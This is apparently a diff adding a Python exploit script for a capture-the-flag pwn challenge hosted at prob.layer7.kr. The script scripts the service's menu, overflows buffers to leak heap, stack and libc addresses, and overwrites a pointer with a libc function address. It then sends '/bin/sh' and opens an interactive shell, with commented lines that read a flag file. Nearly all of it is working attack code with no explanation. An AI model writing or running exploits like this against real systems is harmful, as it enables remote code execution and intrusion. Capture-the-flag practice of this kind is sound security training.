@@ -1,0 +1,158 @@
+import socket
+import struct
+import telnetlib
+from hexdump import *
+
+def recvu(s,string):
+	r = ""
+	while not r.endswith(string):
+		tmp = s.recv(1)
+		if not tmp: break
+		r += tmp
+	return r
+for i in range(0,0xf0000,0x1000):
+	#s = socket.create_connection(['0',1234])
+	s = socket.create_connection(['prob.layer7.kr',10008])
+	#raw_input()
+	recvu(s,'Exit')
+	s.send('1\n')
+	recvu(s,'):')
+	s.send('2\n')
+	recvu(s,'name:')
+	s.send('abcd\n')
+	recvu(s,'size')
+	s.send('100\n')
+	recvu(s,'tion:')
+	s.send('\n')
+	recvu(s,'Exit')
+	s.send('2\n')
+	recvu(s,'N):')
+	s.send('Y\n')
+	recvu(s,'Exit')
+	s.send('1\n')
+	recvu(s,'):')
+	s.send('1\n')
+	recvu(s,'name:')
+	s.send('A'*19+'\n')
+	s.send('111111111111\n')
+	recvu(s,'Exit')
+	s.send('3\n')
+	heap = struct.unpack('<I',recvu(s,'description')[0x37:0x3b])[0]
+	print hex(heap)
+	s.send('4\n')
+	recvu(s,'menu:')
+	s.send('2\n')
+	recvu(s,'menu:')
+	s.send('3\n')
+	recvu(s,'menu:')
+	s.send('3\n')
+	recvu(s,'Exit')
+	s.send('5\n')
+	recvu(s,'ID:')
+	s.send('a'*0x28)
+	recvu(s,'Comment:')
+	s.send('a'*0x28)
+	recvu(s,'password:')
+	s.send('A'*0x11)
+	s.send('Y\n')
+	recvu(s,'ID:')
+	s.send('b'*0x28)
+	recvu(s,'Comment:')
+	s.send('b'*0x28)
+	recvu(s,'password:')
+	s.send('B'*(0x14))
+	ebx = struct.unpack('<I',recvu(s,'You')[-8:-4])[0]-0x42
+	print hex(ebx)
+	recvu(s,'/N)')
+	s.send('N\n')
+	#recvu(s,'Exit')
+	s.send('5\n')
+	recvu(s,'ID:')
+	s.send('a'*0x28)
+	recvu(s,'Comment:')
+	s.send('a'*0x28)
+	recvu(s,'password:')
+	s.send('A'*0x13+struct.pack('<I',ebx-0x44)+'\n')
+	#print hexdump(recvu(s,'N):'))
+	libc = struct.unpack('<I',recvu(s,'N):')[0xaf:0xb3])[0]-0xa-0x1af000
+	print hex(libc)
+
+	s.send('N\n')
+	recvu(s,'Exit')
+	s.send('2\n')
+	s.send('2\n')
+	recvu(s,'):')
+	s.send('Y\n')
+	recvu(s,'Exit')
+	s.send('1\n')
+	recvu(s,'):')
+	s.send('1\n')
+	recvu(s,'name:')
+	s.send('a'*20)
+	recvu(s,'size')
+	s.send('100\n')
+	recvu(s,'tion:')
+	s.send(struct.pack('<I',libc+0x3A920)+'\n')
+	recvu(s,'Exit')
+
+	s.send('4\n')
+	recvu(s,'menu:')
+	s.send('2\n')
+	recvu(s,'menu:')
+	s.send('3\n')
+	recvu(s,'menu:')
+	s.send('3\n')
+	recvu(s,'Exit')
+	s.send('5\n')
+	recvu(s,'ID:')
+	s.send('a'*0x28)
+	recvu(s,'Comment:')
+	s.send('a'*0x28)
+	recvu(s,'password:')
+	s.send('A'*0x13+struct.pack('<I',heap+0x68-0x36-0x2)+'\n')
+	s.send('Y\n')
+	recvu(s,'ID:')
+	s.send('b'*0x28)
+	recvu(s,'Comment:')
+	s.send('b'*0x28)
+	recvu(s,'password:')
+	s.send('A'*0x13+struct.pack('<I',heap+0x68-0x36-0x2)+'\n')
+	'''
+	s.send('2\n')
+	recvu(s,'N):')
+	s.send('Y\n')
+	#recvu(s,'Exit')
+	s.send('1\n')
+	recvu(s,'):')
+	s.send('1\n')
+	print "+++++"
+
+	recvu(s,'name:')
+	s.send('A'*19+'\n')
+	recvu(s,'size:')
+	s.send('111111111111\n')
+	recvu(s,'Exit')
+	s.send('3\n')
+	print s.recv(1024)
+
+	s.send('3\n')
+	print hexdump(recvu(s,'description'))
+	'''
+	recvu(s,'(Y/N):')
+	s.send('N\n')
+	recvu(s,'Exit')
+	s.send('/bin/sh;\x00\n')
+	#s.send('cat /home/remulator/flag\n')
+	'''
+	print [s.recv(1024)]
+	s.send('cat /home/remulator/flag')
+	print [s.recv(1024)]
+	s.send('cat /home/remulator/flag')
+	print [s.recv(1024)]
+	s.send('cat /home/remulator/flag')
+	print [s.recv(1024)]
+	'''
+	print "*****interact*****"
+	t = telnetlib.Telnet()
+	t.sock = s
+	t.interact()
